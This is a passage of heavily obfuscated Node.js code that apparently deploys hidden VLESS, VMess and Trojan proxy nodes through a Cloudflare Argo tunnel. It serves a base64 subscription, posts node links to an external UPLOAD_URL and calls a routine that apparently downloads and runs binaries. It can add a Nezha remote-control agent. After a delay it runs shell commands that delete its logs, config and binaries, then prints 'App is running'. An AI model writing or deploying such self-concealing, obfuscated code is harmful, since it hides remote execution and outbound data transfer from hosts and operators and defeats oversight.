_0x31d674(),_0x3ead2b=NAME?NAME+'-'+_0x1140ef:_0x1140ef;return new Promise(_0x2dec73=>{const _0x3caaca={_0x18d63a:0x14b,_0x1c6b28:0x14b,_0x40ac77:0x13f,_0x4a517f:0x10e,_0x3f73be:0x121,_0x233988:0xfa,_0x5b3445:0xd8,_0xf5fa12:0xb3,_0x1d3ab7:0x8d};setTimeout(()=>{const _0x32e733={_0x4b7ffb:0xb3,_0x27c892:0xed},_0x2ee3fe=_0x48a0,_0x3cc399={'v':'2','ps':''+_0x3ead2b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2ee3fe(_0x3caaca._0x18d63a),'net':'ws','type':_0x2ee3fe(_0x3caaca._0x1c6b28),'host':_0xa807c0,'path':_0x2ee3fe(0xa3),'tls':'tls','sni':_0xa807c0,'alpn':'','fp':_0x2ee3fe(_0x3caaca._0x40ac77)},_0x9cdc7a=_0x2ee3fe(0x105)+UUID+'@'+CFIP+':'+CFPORT+_0x2ee3fe(0x104)+_0xa807c0+_0x2ee3fe(_0x3caaca._0x4a517f)+_0xa807c0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3ead2b+_0x2ee3fe(0xbf)+Buffer[_0x2ee3fe(_0x3caaca._0x3f73be)](JSON[_0x2ee3fe(0x101)](_0x3cc399))[_0x2ee3fe(_0x3caaca._0x233988)](_0x2ee3fe(0xb3))+_0x2ee3fe(0xd6)+UUID+'@'+CFIP+':'+CFPORT+_0x2ee3fe(_0x3caaca._0x5b3445)+_0xa807c0+_0x2ee3fe(0x10e)+_0xa807c0+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3ead2b+_0x2ee3fe(0xf9);console['log'](Buffer[_0x2ee3fe(_0x3caaca._0x3f73be)](_0x9cdc7a)['toString'](_0x2ee3fe(_0x3caaca._0xf5fa12))),fs[_0x2ee3fe(0xfb)](subPath,Buffer[_0x2ee3fe(_0x3caaca._0x3f73be)](_0x9cdc7a)['toString'](_0x2ee3fe(0xb3))),console[_0x2ee3fe(0xa0)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x2ee3fe(_0x3caaca._0x1d3ab7)]('/'+SUB_PATH,(_0x3280b2,_0x3656e2)=>{const _0x367916=_0x2ee3fe,_0x45d2f1=Buffer[_0x367916(0x121)](_0x9cdc7a)['toString'](_0x367916(_0x32e733._0x4b7ffb));_0x3656e2['set']('Content-Type',_0x367916(_0x32e733._0x27c892)),_0x3656e2[_0x367916(0x149)](_0x45d2f1);}),_0x2dec73(_0x9cdc7a);},0x7d0);});}}function _0x48a0(_0x21bb81,_0x20b76b){const _0x1a0d93=_0x1a0d();return _0x48a0=function(_0x48a03b,_0x258da9){_0x48a03b=_0x48a03b-0x8c;let _0x5319e5=_0x1a0d93[_0x48a03b];return _0x5319e5;},_0x48a0(_0x21bb81,_0x20b76b);}async function uploadNodes(){const _0x5888ff={_0x24fe9c:0x152,_0x89b467:0xbd,_0x34c4d3:0x140,_0x139cfb:0xa0,_0x2190cc:0xda,_0x1819da:0xff,_0x8a2b63:0x155},_0x188604=_0x3259f0;if(UPLOAD_URL&&PROJECT_URL){const _0x121e73=PROJECT_URL+'/'+SUB_PATH,_0x45781a={'subscription':[_0x121e73]};try{const _0x2d71a0=await axios[_0x188604(0xc2)](UPLOAD_URL+_0x188604(_0x5888ff._0x24fe9c),_0x45781a,{'headers':{'Content-Type':_0x188604(_0x5888ff._0x89b467)}});return _0x2d71a0&&_0x2d71a0[_0x188604(_0x5888ff._0x34c4d3)]===0xc8?(console[_0x188604(_0x5888ff._0x139cfb)](_0x188604(0xbb)),_0x2d71a0):null;}catch(_0x273094){if(_0x273094['response']){if(_0x273094[_0x188604(0x145)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x336617=fs[_0x188604(_0x5888ff._0x2190cc)](listPath,_0x188604(0xc5)),_0x307dc4=_0x336617[_0x188604(_0x5888ff._0x1819da)]('\x0a')['filter'](_0x350547=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x188604(0x14f)](_0x350547));if(_0x307dc4[_0x188604(0x103)]===0x0)return;const _0x168613=JSON[_0x188604(0x101)]({'nodes':_0x307dc4});try{const _0x2cff82=await axios[_0x188604(0xc2)](UPLOAD_URL+_0x188604(_0x5888ff._0x8a2b63),_0x168613,{'headers':{'Content-Type':_0x188604(0xbd)}});return _0x2cff82&&_0x2cff82[_0x188604(0x140)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x2cff82):null;}catch(_0x25ec70){return null;}}else return;}}function cleanFiles(){const _0x35e82e={_0x232b4f:0x130,_0x500718:0xca,_0x4c7d32:0x94,_0x1259d1:0x114,_0x24562d:0x14d,_0x3462a1:0xde},_0x35cdbe={_0x3f57cf:0x95,_0x2f3d49:0xa0};setTimeout(()=>{const _0x10001e={_0x542bef:0xa0},_0x41231f=_0x48a0,_0xfb9887=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xfb9887[_0x41231f(0xa9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xfb9887['push'](phpPath);process[_0x41231f(_0x35e82e._0x232b4f)]==='win32'?exec(_0x41231f(_0x35e82e._0x500718)+_0xfb9887[_0x41231f(_0x35e82e._0x4c7d32)]('\x20')+_0x41231f(_0x35e82e._0x1259d1),_0x399bb2=>{const _0x192175=_0x41231f;console[_0x192175(_0x35cdbe._0x3f57cf)](),console[_0x192175(0xa0)]('App\x20is\x20running'),console[_0x192175(_0x35cdbe._0x2f3d49)](_0x192175(0x119));}):exec(_0x41231f(_0x35e82e._0x24562d)+_0xfb9887[_0x41231f(0x94)]('\x20')+_0x41231f(_0x35e82e._0x3462a1),_0x4dcd0c=>{const _0x3c512e=_0x41231f;console[_0x3c512e(0x95)](),console[_0x3c512e(_0x10001e._0x542bef)](_0x3c512e(0xb5)),console['log'](_0x3c512e(0x119));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x910378={_0x2c73e8:0x120,_0x5a16c9:0x112,_0x5dc860:0xfc},_0x3ade68=_0x3259f0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3ade68(0xa0)](_0x3ade68(_0x910378._0x2c73e8));return;}try{const _0x40ddf9=await axios['post'](_0x3ade68(0x12a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3ade68(0xbd)}});return console['log'](_0x3ade68(_0x910378._0x5a16c9)),_0x40ddf9;}catch(_0x3334d4){return console[_0x3ade68(0xe4)](_0x3ade68(_0x910378._0x5dc860)+_0x3334d4[_0x3ade68(0x142)]),null;}}async function startserver(){const _0x53a5d1={_0x8c1434:0xe4},_0x52a2d7=_0x3259f0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x48a831){console[_0x52a2d7(_0x53a5d1._0x8c1434)](_0x52a2d7(0xd2),_0x48a831);}}startserver()['catch'](_0x125da9=>{const _0x20ebb0=_0x3259f0;console[_0x20ebb0(0xe4)]('Unhandled\x20error\x20in\x20startserver:',_0x125da9);}),app[_0x3259f0(0x153)](PORT,()=>console[_0x3259f0(0xa0)](_0x3259f0(0x10f)+PORT+'!'));
